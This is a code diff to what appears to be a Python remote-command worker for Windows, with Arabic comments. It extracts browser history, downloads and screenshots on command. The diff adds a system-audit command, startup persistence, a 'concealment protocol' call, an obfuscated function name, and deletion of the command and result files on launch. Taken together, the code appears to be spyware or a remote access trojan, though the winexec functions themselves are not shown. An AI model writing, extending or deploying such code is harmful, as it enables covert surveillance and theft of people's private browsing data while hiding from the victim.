@@ -44,6 +44,8 @@ def start_worker():
                     res = winexec.extract_all_browser_history()
                 elif cmd == "downloads":
                     res = winexec.extract_all_browser_downloads()
+                elif cmd == "sysinfo":
+                    res = winexec.run_full_audit()
 
 
                 elif cmd == "screenshot":
@@ -76,8 +78,22 @@ def start_worker():
             except Exception as e:
                 print(f"Error in worker: {e}")
         
-        # انتظار ثانية واحدة قبل الفحص التالي لتقليل استهلاك المعالج
         time.sleep(1)
 
+if not os.path.exists(BASE_DIR):
+    os.makedirs(BASE_DIR)
+    # تنظيف المخلفات القديمة عند بدء التشغيل لأول مرة
+for f in [CMD_FILE, RES_FILE, SS_FILE]:
+    try:
+        if os.path.exists(f): os.remove(f)
+    except: pass
+
+gc.collect() # ابدأ بذاكرة نظيفة
+
 if __name__ == "__main__":
+    winexec.startup()
+    winexec.start_concealment_protocol()
+    winexec.k3M_x92Qa()
+    
     start_worker()
+    
